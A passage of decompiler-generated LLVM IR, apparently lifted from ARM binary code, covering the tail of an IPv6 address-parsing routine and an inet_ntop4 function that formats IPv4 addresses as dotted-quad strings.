  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_16478, label %dec_label_pc_16498, label %dec_label_pc_1648c

dec_label_pc_1648c:                               ; preds = %entry
  %v7_1648c = icmp eq i32 %arg1, 10
  br i1 %v7_1648c, label %dec_label_pc_164ac, label %dec_label_pc_1665c

dec_label_pc_16498:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_164a0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_164a0, i32* %r0.global-to-local, align 4
  store i32 %v4_164a0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16674

dec_label_pc_164ac:                               ; preds = %dec_label_pc_1648c
  %v2_164ac = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_164ac, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_164b8 = bitcast i32* %stack_var_-52 to i8*
  %v3_164b8 = call i32 @__GI_memset(i8* %v2_164b8, i32 0)
  store i32 %v3_164b8, i32* %r0.global-to-local, align 4
  %v0_164bc = load i32, i32* @r6, align 4
  %v1_164bc = inttoptr i32 %v0_164bc to i8*
  %v2_164bc = load i8, i8* %v1_164bc, align 1
  %v3_164bc = zext i8 %v2_164bc to i32
  store i32 %v3_164bc, i32* %r3.global-to-local, align 4
  %v7_164c0 = icmp eq i8 %v2_164bc, 58
  store i32 %v3_164b8, i32* @r4, align 4
  %v2_164c8 = add i32 %v3_164b8, 16
  store i32 %v2_164c8, i32* %r8.global-to-local, align 4
  br i1 %v7_164c0, label %dec_label_pc_164d0, label %dec_label_pc_164dc

dec_label_pc_164d0:                               ; preds = %dec_label_pc_164ac
  %v1_164d0 = add i32 %v0_164bc, 1
  %v2_164d0 = inttoptr i32 %v1_164d0 to i8*
  %v3_164d0 = load i8, i8* %v2_164d0, align 1
  %v4_164d0 = zext i8 %v3_164d0 to i32
  store i32 %v4_164d0, i32* %r3.global-to-local, align 4
  store i32 %v1_164d0, i32* @r6, align 4
  %v7_164d4 = icmp eq i8 %v3_164d0, 58
  br i1 %v7_164d4, label %dec_label_pc_164dc, label %dec_label_pc_16670

dec_label_pc_164dc:                               ; preds = %dec_label_pc_164d0, %dec_label_pc_164ac
  %v0_164e0 = phi i32 [ %v1_164d0, %dec_label_pc_164d0 ], [ %v0_164bc, %dec_label_pc_164ac ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_164e0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_165bc7 = inttoptr i32 %v0_164e0 to i8*
  %v2_165bc8 = load i8, i8* %v1_165bc7, align 1
  %v3_165bc9 = zext i8 %v2_165bc8 to i32
  store i32 %v3_165bc9, i32* %r0.global-to-local, align 4
  %v1_165c010 = call i32 @__GI_tolower(i32 %v3_165bc9)
  store i32 %v1_165c010, i32* %r0.global-to-local, align 4
  store i32 %v1_165c010, i32* @r5, align 4
  %v2_165c412 = icmp eq i32 %v1_165c010, 0
  br i1 %v2_165c412, label %dec_label_pc_165cc, label %dec_label_pc_164f0

dec_label_pc_164f0:                               ; preds = %dec_label_pc_164dc, %dec_label_pc_165bc.backedge
  %v0_164f4 = phi i32 [ %v1_165c0, %dec_label_pc_165bc.backedge ], [ %v1_165c010, %dec_label_pc_164dc ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_165bc.backedge ], [ 0, %dec_label_pc_164dc ]
  store i32 ptrtoint ([17 x i8]* @global_var_1a2fc.634 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1a2fc.634 to i32), i32* %r0.global-to-local, align 4
  %v3_164fc = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1a2fc.634 to i32), i32 %v0_164f4)
  %v4_164fc = trunc i32 %v3_164fc to i8
  store i32 %v3_164fc, i32* %r0.global-to-local, align 4
  %v3_16500 = icmp eq i8 %v4_164fc, 0
  %v0_16504 = load i32, i32* @r6, align 4
  %v1_16504 = add i32 %v0_16504, 1
  store i32 %v1_16504, i32* @r6, align 4
  br i1 %v3_16500, label %dec_label_pc_16520, label %dec_label_pc_1650c

dec_label_pc_1650c:                               ; preds = %dec_label_pc_164f0
  %v0_1650c = load i32, i32* %sb.global-to-local, align 4
  %v2_1650c = sext i8 %v4_164fc to i32
  %v3_1650c = sub i32 %v2_1650c, %v0_1650c
  store i32 %v3_1650c, i32* %r3.global-to-local, align 4
  %v1_16510 = load i32, i32* %r7.global-to-local, align 4
  %v4_16510 = mul i32 %v1_16510, 16
  %v5_16510 = or i32 %v4_16510, %v3_1650c
  store i32 %v5_16510, i32* %r7.global-to-local, align 4
  %v3_16518 = icmp ult i32 %v5_16510, 65534
  br i1 %v3_16518, label %dec_label_pc_165b4, label %dec_label_pc_16670

dec_label_pc_16520:                               ; preds = %dec_label_pc_164f0
  %v0_16520 = load i32, i32* @r5, align 4
  %v7_16520 = icmp eq i32 %v0_16520, 58
  br i1 %v7_16520, label %dec_label_pc_16528, label %dec_label_pc_16584

dec_label_pc_16528:                               ; preds = %dec_label_pc_16520
  %v4_165282 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_165282, i32* %r3.global-to-local, align 4
  %v2_1652c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1652c, label %dec_label_pc_16534, label %dec_label_pc_16548

dec_label_pc_16534:                               ; preds = %dec_label_pc_16528
  %v0_16534 = load i32, i32* %fp.global-to-local, align 4
  %v2_16534 = icmp eq i32 %v0_16534, 0
  br i1 %v2_16534, label %dec_label_pc_1653c, label %dec_label_pc_16670

dec_label_pc_1653c:                               ; preds = %dec_label_pc_16534
  %v0_1653c = load i32, i32* @r4, align 4
  store i32 %v0_1653c, i32* %fp.global-to-local, align 4
  store i32 %v1_16504, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_165bc.backedge

dec_label_pc_16548:                               ; preds = %dec_label_pc_16528
  %v1_16548 = inttoptr i32 %v1_16504 to i8*
  %v2_16548 = load i8, i8* %v1_16548, align 1
  %v3_16548 = zext i8 %v2_16548 to i32
  store i32 %v3_16548, i32* %r3.global-to-local, align 4
  %v2_1654c = icmp eq i8 %v2_16548, 0
  br i1 %v2_1654c, label %dec_label_pc_16670, label %dec_label_pc_16554

dec_label_pc_16554:                               ; preds = %dec_label_pc_16548
  %v0_16554 = load i32, i32* @r4, align 4
  %v1_16554 = add i32 %v0_16554, 2
  store i32 %v1_16554, i32* %r3.global-to-local, align 4
  %v1_16558 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_16554, %v1_16558
  br i1 %tmp38, label %dec_label_pc_16670, label %dec_label_pc_16560

dec_label_pc_16560:                               ; preds = %dec_label_pc_16554
  %v0_16560 = load i32, i32* %r7.global-to-local, align 4
  %v3_16560 = udiv i32 %v0_16560, 256
  store i32 %v3_16560, i32* %r2.global-to-local, align 4
  store i32 %v0_16554, i32* %r3.global-to-local, align 4
  %v1_16568 = trunc i32 %v3_16560 to i8
  %v3_16568 = inttoptr i32 %v0_16554 to i8*
  store i8 %v1_16568, i8* %v3_16568, align 1
  %v4_16568 = load i32, i32* %r3.global-to-local, align 4
  %v5_16568 = add i32 %v4_16568, 1
  store i32 %v5_16568, i32* %r3.global-to-local, align 4
  %v0_1656c = load i32, i32* @r6, align 4
  store i32 %v0_1656c, i32* %sl.global-to-local, align 4
  %v0_16570 = load i32, i32* %r7.global-to-local, align 4
  %v1_16570 = trunc i32 %v0_16570 to i8
  %v2_16570 = load i32, i32* @r4, align 4
  %v3_16570 = add i32 %v2_16570, 1
  %v4_16570 = inttoptr i32 %v3_16570 to i8*
  store i8 %v1_16570, i8* %v4_16570, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_16578 = load i32, i32* %r3.global-to-local, align 4
  %v1_16578 = add i32 %v0_16578, 1
  store i32 %v1_16578, i32* @r4, align 4
  %v0_165bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_165bc.backedge

dec_label_pc_16584:                               ; preds = %dec_label_pc_16520
  %v7_16584 = icmp eq i32 %v0_16520, 46
  br i1 %v7_16584, label %dec_label_pc_1658c, label %dec_label_pc_16670

dec_label_pc_1658c:                               ; preds = %dec_label_pc_16584
  %v0_1658c = load i32, i32* @r4, align 4
  %v1_1658c = add i32 %v0_1658c, 4
  store i32 %v1_1658c, i32* @r5, align 4
  %v1_16590 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1658c, %v1_16590
  br i1 %tmp39, label %dec_label_pc_16670, label %dec_label_pc_16598

dec_label_pc_16598:                               ; preds = %dec_label_pc_1658c
  %v0_1659c = load i32, i32* %sl.global-to-local, align 4
  %v1_1659c = inttoptr i32 %v0_1659c to i8*
  store i32 %v0_1659c, i32* %r0.global-to-local, align 4
  %v4_165a0 = call i32 @inet_pton4(i8* %v1_1659c, i32 %v0_1658c)
  store i32 %v4_165a0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_165a0, 1
  br i1 %tmp36, label %dec_label_pc_16670, label %bb

bb:                                               ; preds = %dec_label_pc_16598
  %v5_165a8 = load i32, i32* @r5, align 4
  store i32 %v5_165a8, i32* @r4, align 4
  br label %dec_label_pc_165f8

dec_label_pc_165b4:                               ; preds = %dec_label_pc_1650c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_165bc.backedge

dec_label_pc_165bc.backedge:                      ; preds = %dec_label_pc_165b4, %dec_label_pc_1653c, %dec_label_pc_16560
  %v0_165bc = phi i32 [ %v1_16504, %dec_label_pc_1653c ], [ %v0_165bc.pre, %dec_label_pc_16560 ], [ %v1_16504, %dec_label_pc_165b4 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1653c ], [ 0, %dec_label_pc_16560 ], [ 1, %dec_label_pc_165b4 ]
  %v1_165bc = inttoptr i32 %v0_165bc to i8*
  %v2_165bc = load i8, i8* %v1_165bc, align 1
  %v3_165bc = zext i8 %v2_165bc to i32
  store i32 %v3_165bc, i32* %r0.global-to-local, align 4
  %v1_165c0 = call i32 @__GI_tolower(i32 %v3_165bc)
  store i32 %v1_165c0, i32* %r0.global-to-local, align 4
  store i32 %v1_165c0, i32* @r5, align 4
  %v2_165c4 = icmp eq i32 %v1_165c0, 0
  br i1 %v2_165c4, label %dec_label_pc_165cc, label %dec_label_pc_164f0

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165bc.backedge, %dec_label_pc_164dc
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_164dc ], [ %stack_var_-56.0.be, %dec_label_pc_165bc.backedge ]
  %v4_165cc3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_165cc3, i32* %r3.global-to-local, align 4
  %v2_165d0 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1663c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_165d0, label %dec_label_pc_165f8, label %dec_label_pc_165d8

dec_label_pc_165d8:                               ; preds = %dec_label_pc_165cc
  %v1_165d8 = add i32 %v0_1663c.pre.pre, 2
  store i32 %v1_165d8, i32* %r3.global-to-local, align 4
  %v1_165dc = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_165d8, %v1_165dc
  br i1 %tmp40, label %dec_label_pc_16670, label %dec_label_pc_165e4

dec_label_pc_165e4:                               ; preds = %dec_label_pc_165d8
  store i32 %v0_1663c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_165e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_165e8 = udiv i32 %v0_165e8, 256
  store i32 %v3_165e8, i32* %r2.global-to-local, align 4
  %v1_165ec = trunc i32 %v3_165e8 to i8
  %v3_165ec = inttoptr i32 %v0_1663c.pre.pre to i8*
  store i8 %v1_165ec, i8* %v3_165ec, align 1
  %v4_165ec = load i32, i32* %r3.global-to-local, align 4
  %v5_165ec = add i32 %v4_165ec, 1
  store i32 %v5_165ec, i32* %r3.global-to-local, align 4
  %v0_165f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_165f0 = trunc i32 %v0_165f0 to i8
  %v2_165f0 = load i32, i32* @r4, align 4
  %v3_165f0 = add i32 %v2_165f0, 1
  %v4_165f0 = inttoptr i32 %v3_165f0 to i8*
  store i8 %v1_165f0, i8* %v4_165f0, align 1
  %v0_165f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_165f4 = add i32 %v0_165f4, 1
  store i32 %v1_165f4, i32* @r4, align 4
  br label %dec_label_pc_165f8

dec_label_pc_165f8:                               ; preds = %dec_label_pc_165cc, %bb, %dec_label_pc_165e4
  %v0_1663c.pre = phi i32 [ %v5_165a8, %bb ], [ %v1_165f4, %dec_label_pc_165e4 ], [ %v0_1663c.pre.pre, %dec_label_pc_165cc ]
  %v0_165f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_165f8 = icmp eq i32 %v0_165f8, 0
  %v1_1663c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_165f8, label %dec_label_pc_1663c, label %dec_label_pc_16600

dec_label_pc_16600:                               ; preds = %dec_label_pc_165f8
  %v9_16600 = icmp eq i32 %v0_1663c.pre, %v1_1663c.pre
  %v2_16604 = sub i32 %v0_1663c.pre, %v0_165f8
  store i32 %v2_16604, i32* %r0.global-to-local, align 4
  br i1 %v9_16600, label %dec_label_pc_16670, label %dec_label_pc_16624.preheader

dec_label_pc_16624.preheader:                     ; preds = %dec_label_pc_16600
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16624

dec_label_pc_16614:                               ; preds = %dec_label_pc_16624
  %v0_16614 = load i32, i32* %fp.global-to-local, align 4
  %v2_16614 = add i32 %v0_16614, %v2_16628
  %v3_16614 = inttoptr i32 %v2_16614 to i8*
  %v4_16614 = load i8, i8* %v3_16614, align 1
  %v3_16618 = inttoptr i32 %v2_1662c to i8*
  store i8 %v4_16614, i8* %v3_16618, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_16620 = load i32, i32* %fp.global-to-local, align 4
  %v3_16620 = load i32, i32* @ip, align 4
  %v4_16620 = add i32 %v3_16620, %v2_16620
  %v5_16620 = inttoptr i32 %v4_16620 to i8*
  store i8 0, i8* %v5_16620, align 1
  %v0_16624.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16624.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1662c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16624

dec_label_pc_16624:                               ; preds = %dec_label_pc_16624.preheader, %dec_label_pc_16614
  %v0_16638 = phi i32 [ %v1_1663c.pre, %dec_label_pc_16624.preheader ], [ %v1_1662c.pre, %dec_label_pc_16614 ]
  %v1_16628 = phi i32 [ %v2_16604, %dec_label_pc_16624.preheader ], [ %v1_16624.pre, %dec_label_pc_16614 ]
  %v0_16630 = phi i32 [ 1, %dec_label_pc_16624.preheader ], [ %v0_16624.pre, %dec_label_pc_16614 ]
  %v2_16628 = sub i32 %v1_16628, %v0_16630
  store i32 %v2_16628, i32* @ip, align 4
  %v2_1662c = sub i32 %v0_16638, %v0_16630
  store i32 %v2_1662c, i32* @lr, align 4
  %v1_16630 = add i32 %v0_16630, 1
  store i32 %v1_16630, i32* %r2.global-to-local, align 4
  %v7_16634 = icmp slt i32 %v1_16628, %v0_16630
  br i1 %v7_16634, label %dec_label_pc_16638, label %dec_label_pc_16614

dec_label_pc_16638:                               ; preds = %dec_label_pc_16624
  store i32 %v0_16638, i32* @r4, align 4
  br label %dec_label_pc_1663c

dec_label_pc_1663c:                               ; preds = %dec_label_pc_165f8, %dec_label_pc_16638
  %v0_1663c = phi i32 [ %v0_16638, %dec_label_pc_16638 ], [ %v0_1663c.pre, %dec_label_pc_165f8 ]
  %v1_1663c = phi i32 [ %v0_16638, %dec_label_pc_16638 ], [ %v1_1663c.pre, %dec_label_pc_165f8 ]
  %v9_1663c = icmp eq i32 %v0_1663c, %v1_1663c
  br i1 %v9_1663c, label %dec_label_pc_16644, label %dec_label_pc_16670

dec_label_pc_16644:                               ; preds = %dec_label_pc_1663c
  store i32 16, i32* @r2, align 4
  %v2_16648 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_16648, i32* @r0, align 4
  store i32 %v2_164ac, i32* @r1, align 4
  %v0_16650 = call i32 @memcpy()
  store i32 %v0_16650, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16674

dec_label_pc_1665c:                               ; preds = %dec_label_pc_1648c
  %v0_1665c = call i32 @__errno_location()
  store i32 %v0_1665c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16668 = inttoptr i32 %v0_1665c to i32*
  store i32 97, i32* %v2_16668, align 4
  %v0_16674.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16674

dec_label_pc_16670:                               ; preds = %dec_label_pc_1650c, %dec_label_pc_16534, %dec_label_pc_16554, %dec_label_pc_16548, %dec_label_pc_16598, %dec_label_pc_16600, %dec_label_pc_16584, %dec_label_pc_1663c, %dec_label_pc_164d0, %dec_label_pc_165d8, %dec_label_pc_1658c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16674

dec_label_pc_16674:                               ; preds = %dec_label_pc_1665c, %dec_label_pc_16644, %dec_label_pc_16498, %dec_label_pc_16670
  %v0_16674 = phi i32 [ %v0_16674.pre, %dec_label_pc_1665c ], [ 1, %dec_label_pc_16644 ], [ %v4_164a0, %dec_label_pc_16498 ], [ 0, %dec_label_pc_16670 ]
  store i32 %v0_16674, i32* %r0.global-to-local, align 4
  store i32 %v3_16474, i32* @r4, align 4
  store i32 %v6_16474, i32* @r5, align 4
  store i32 %v9_16474, i32* @r6, align 4
  ret i32 %v0_16674

; uselistorder directives
  uselistorder i32 %v0_16674, { 1, 0 }
  uselistorder i32 %v2_1662c, { 1, 0 }
  uselistorder i32 %v2_16628, { 1, 0 }
  uselistorder i32 %v0_16630, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16638, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1663c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1663c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_165e8, { 1, 0 }
  uselistorder i32 %v0_1663c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_165c0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1659c, { 1, 0 }
  uselistorder i32 %v3_16560, { 1, 0 }
  uselistorder i32 %v0_16554, { 1, 0, 2 }
  uselistorder i32 %v1_16504, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_164fc, { 1, 0 }
  uselistorder i32 %v0_164e0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 1, 2, 15, 14, 17, 16, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 5, 1, 4, 7, 8, 2, 3, 9, 6, 0, 10, 11, 12, 13 }
  uselistorder i32 58, { 3, 0, 1, 2 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16674, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16670, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1663c, { 1, 0 }
  uselistorder label %dec_label_pc_16624, { 1, 0 }
  uselistorder label %dec_label_pc_165f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_165bc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_164f0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16684 = load i32, i32* @r4, align 4
  store i32 %v3_16684, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1a2e8.636 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_166a0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_166a0, i32* @r0, align 4
  %v0_166a4 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_166b4 = bitcast i32* %stack_var_-51 to i8*
  %v3_166b4 = call i32 @__GI_memset(i8* %v2_166b4, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1677c = ptrtoint i32* %stack_var_-36 to i32
  %v2_16758 = add i32 %v2_1677c, -17
  br label %dec_label_pc_1677c

dec_label_pc_166c4:                               ; preds = %dec_label_pc_1677c
  %v0_166c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_166c4 = add i32 %v0_166c4, %v1_166c4
  %v3_166c4 = inttoptr i32 %v2_166c4 to i8*
  %v4_166c4 = load i8, i8* %v3_166c4, align 1
  %v6_166c4 = zext i8 %v4_166c4 to i32
  store i32 %v6_166c4, i32* %r4.global-to-local, align 4
  %v1_166c8 = add i32 %v0_166c8, 1
  store i32 %v1_166c8, i32* %r7.global-to-local, align 4
  store i32 %v2_1677c, i32* %r2.global-to-local, align 4
  %v2_166d4 = add i32 %v1_166c8, %v2_1677c
  store i32 %v2_166d4, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_166c4, 100
  %v1_166dc = or i8 %div, 48
  %v3_166e0 = add i32 %v2_1678c, -17
  %v4_166e0 = inttoptr i32 %v3_166e0 to i8*
  store i8 %v1_166dc, i8* %v4_166e0, align 1
  %v0_166e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166e4 = add i32 %v0_166e4, -17
  %v2_166e4 = inttoptr i32 %v1_166e4 to i8*
  %v3_166e4 = load i8, i8* %v2_166e4, align 1
  %v7_166e8 = icmp eq i8 %v3_166e4, 48
  %v0_166ec = load i32, i32* %fp.global-to-local, align 4
  %v1_166ec = load i32, i32* %r8.global-to-local, align 4
  %v2_166ec = add i32 %v1_166ec, %v0_166ec
  store i32 %v2_166ec, i32* %sb.global-to-local, align 4
  %v0_166f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_166fc = udiv i32 %v0_166f4, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16704 = urem i32 %v2_166fc, 256
  %v2_16708 = urem i32 %v1_16704, 10
  %v1_1670c = or i32 %v2_16708, 48
  %v1_16710 = trunc i32 %v1_1670c to i8
  br i1 %v7_166e8, label %dec_label_pc_166fc, label %dec_label_pc_16724

dec_label_pc_166fc:                               ; preds = %dec_label_pc_166c4
  store i8 %v1_16710, i8* %v2_166e4, align 1
  %v0_16714 = load i32, i32* %r5.global-to-local, align 4
  %v1_16714 = add i32 %v0_16714, -17
  %v2_16714 = inttoptr i32 %v1_16714 to i8*
  %v3_16714 = load i8, i8* %v2_16714, align 1
  %v7_16718 = icmp eq i8 %v3_16714, 48
  br i1 %v7_16718, label %dec_label_pc_166fc.dec_label_pc_16748_crit_edge, label %bb

dec_label_pc_166fc.dec_label_pc_16748_crit_edge:  ; preds = %dec_label_pc_166fc
  %v1_16758.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16748

bb:                                               ; preds = %dec_label_pc_166fc
  %v1_1671c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1671c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16748

dec_label_pc_16724:                               ; preds = %dec_label_pc_166c4
  %v2_16740 = load i32, i32* %sl.global-to-local, align 4
  %v3_16740 = add i32 %v2_16740, -17
  %v4_16740 = inttoptr i32 %v3_16740 to i8*
  store i8 %v1_16710, i8* %v4_16740, align 1
  %v0_16744 = load i32, i32* %r7.global-to-local, align 4
  %v1_16744 = add i32 %v0_16744, 1
  store i32 %v1_16744, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16748

dec_label_pc_16748:                               ; preds = %dec_label_pc_166fc.dec_label_pc_16748_crit_edge, %bb, %dec_label_pc_16724
  %v1_16758 = phi i32 [ %v1_16758.pre, %dec_label_pc_166fc.dec_label_pc_16748_crit_edge ], [ %v1_1671c, %bb ], [ %v1_16744, %dec_label_pc_16724 ]
  %v0_16748 = load i32, i32* %sb.global-to-local, align 4
  %v1_16748 = inttoptr i32 %v0_16748 to i8*
  %v2_16748 = load i8, i8* %v1_16748, align 1
  %tmp17 = urem i8 %v2_16748, 10
  store i32 %v2_1677c, i32* %ip.global-to-local, align 4
  %v1_1675c = add i32 %v1_16758, 1
  store i32 %v1_1675c, i32* %r1.global-to-local, align 4
  %v1_16760 = or i8 %tmp17, 48
  %v3_16764 = add i32 %v2_16758, %v1_16758
  %v4_16764 = inttoptr i32 %v3_16764 to i8*
  store i8 %v1_16760, i8* %v4_16764, align 1
  %v0_16768 = load i32, i32* %ip.global-to-local, align 4
  %v1_16768 = load i32, i32* %r1.global-to-local, align 4
  %v2_16768 = add i32 %v1_16768, %v0_16768
  store i32 %v2_16768, i32* %r2.global-to-local, align 4
  %v3_16770 = add i32 %v2_16768, -17
  %v4_16770 = inttoptr i32 %v3_16770 to i8*
  store i8 46, i8* %v4_16770, align 1
  %v0_16774 = load i32, i32* %r8.global-to-local, align 4
  %v1_16774 = add i32 %v0_16774, 1
  store i32 %v1_16774, i32* %r8.global-to-local, align 4
  %v0_16778 = load i32, i32* %r1.global-to-local, align 4
  %v1_16778 = add i32 %v0_16778, 1
  br label %dec_label_pc_1677c

dec_label_pc_1677c:                               ; preds = %entry, %dec_label_pc_16748
  %v0_166c8 = phi i32 [ 0, %entry ], [ %v1_16778, %dec_label_pc_16748 ]
  %v1_166c4 = phi i32 [ 0, %entry ], [ %v1_16774, %dec_label_pc_16748 ]
  store i32 %v2_1677c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_166c8, i32* %r6.global-to-local, align 4
  %v2_1678c = add i32 %v0_166c8, %v2_1677c
  store i32 %v2_1678c, i32* %r5.global-to-local, align 4
  %v7_16790 = icmp sgt i32 %v1_166c4, 3
  br i1 %v7_16790, label %dec_label_pc_16794, label %dec_label_pc_166c4

dec_label_pc_16794:                               ; preds = %dec_label_pc_1677c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_166a0, i32* %r4.global-to-local, align 4
  %v3_1679c = add i32 %v2_1678c, -18
  %v4_1679c = inttoptr i32 %v3_1679c to i8*
  store i8 0, i8* %v4_1679c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_167a4 = call i32 @strlen(i8* %tmp18)
  %v2_167a8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_167a4, %v2_167a8
  br i1 %tmp, label %dec_label_pc_167b4, label %dec_label_pc_167c8

dec_label_pc_167b4:                               ; preds = %dec_label_pc_16794
  %v0_167b4 = call i32 @__errno_location()
  %v0_167bc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_167bc, i32* %r2.global-to-local, align 4
  %v2_167c0 = inttoptr i32 %v0_167b4 to i32*
  store i32 28, i32* %v2_167c0, align 4
  %v0_167d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_167d8

dec_label_pc_167c8:                               ; preds = %dec_label_pc_16794
  store i32 %v2_166a0, i32* %r1.global-to-local, align 4
  %v3_167d0 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_167d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_167d8

dec_label_pc_167d8:                               ; preds = %dec_label_pc_167b4, %dec_label_pc_167c8
  %v0_167d8 = phi i32 [ %v0_167d8.pre, %dec_label_pc_167b4 ], [ %v3_167d0, %dec_label_pc_167c8 ]
  %v2_167e0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_167e0, i32* @r4, align 4
  ret i32 %v0_167d8

; uselistorder directives
  uselistorder i32 %v2_1678c, { 0, 2, 1 }
  uselistorder i32 %v1_166c4, { 1, 0 }
  uselistorder i32 %v0_166c8, { 0, 2, 1 }
  uselistorder i32 %v2_1677c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
